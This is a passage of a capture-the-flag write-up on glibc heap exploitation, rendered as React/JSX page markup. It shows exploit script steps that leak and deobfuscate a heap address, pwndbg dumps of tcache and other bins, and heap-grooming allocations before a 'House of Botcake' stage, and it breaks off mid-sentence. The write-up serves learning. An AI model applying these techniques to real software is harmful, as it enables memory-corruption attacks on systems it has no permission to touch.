punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#excess\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#excess\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Place them into the tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#This printed out a heap address\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#Parse, deobfuscate, and set heap base.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap_leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" deobfuscate\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# seccomp actually alloc'd over a page of memory,\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# so base was -0x1000 from what I got.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap_leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<<\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1000\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"From here, we need to talk about what we actually have been interacting with. The tcache is an array of linked lists which store freed chunks on a per-thread basis. The linked lists are indexed in order, and correspond to chunks of size 16-1032 bytes, increments of 16 bytes. This is a speedup in practice, as there is necessary thread safety operations when trying to alloc in general, since heap is shared among threads, where as this is a custom cache for each thread of your program. The big thing comes from the fact that they are terribly exploitable.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"However, seccomp alloc'd and freed a lot of memory prior, so when debugging with pwndbg, I can check the bins with \",(0,n.jsx)(e.code,{children:\"bins\"}),\" or their specific names \",(0,n.jsx)(e.code,{children:\"tcachebins\"}),\", \",(0,n.jsx)(e.code,{children:\"fastbins\"}),\", etc. And I noticed that there was a lot of mess before I wanted to start actual exploit development:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`tcachebins\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1fd0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2280\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1750\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1e30\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1c90\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1af0\"}),` \\u2014\\u25B8\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea16c0\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x70\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1990\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1b30\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1cd0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1e70\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2010\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2190\"}),` \\u2014\\u25B8\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea16e0\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x80\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea18f0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1a70\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1c10\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1db0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1f50\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2200\"}),` \\u2014\\u25B8\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1640\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x90\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1530\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea14a0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1800\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1770\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0xd0\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1170\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea0e40\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea0b10\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea07e0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea0350\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0xf0\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"  \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2080\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1370\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`fastbins\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`unsortedbin\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"all\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea15b0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f8ff5a19ce0\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"main_arena\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"96\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea15b0\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`smallbins\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea2160\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1fe0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1e40\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1ca0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1b00\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x60\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1880\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f8ff5a19d30\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"main_arena\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"176\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1880\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0x70\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea19f0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1b90\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1d30\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x560865ea1ed0\"}),\" \\u2014\\u25B8 \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f8ff5a19d40\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"main_arena\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"192\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \\u25C2\\u2014 \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"To remedy this, I just made a bunch of allocs (and leaked memory), until all of the bins were empty (yes, 16 is there twice, dont worry about it):\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Cleaning tcaches + smallbins\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x60\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x70\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x80\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xc0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xe0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"11\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x30\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"I kept adding allocs until gdb said the bins were empty. \",(0,n.jsx)(e.em,{children:\"Now\"}),\", we can start doing some exploit chain... right?\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"one-more-leak-now-with-cakes-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#one-more-leak-now-with-cakes-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"One More Leak, now with cakes! \",(0,n.jsx)(\"a\",{name:\"botcake\"})]}),`\n`,(0,n.jsx)(e.p,{children:\"If other protections didn\\u2019t exist, I would be pretty set. But 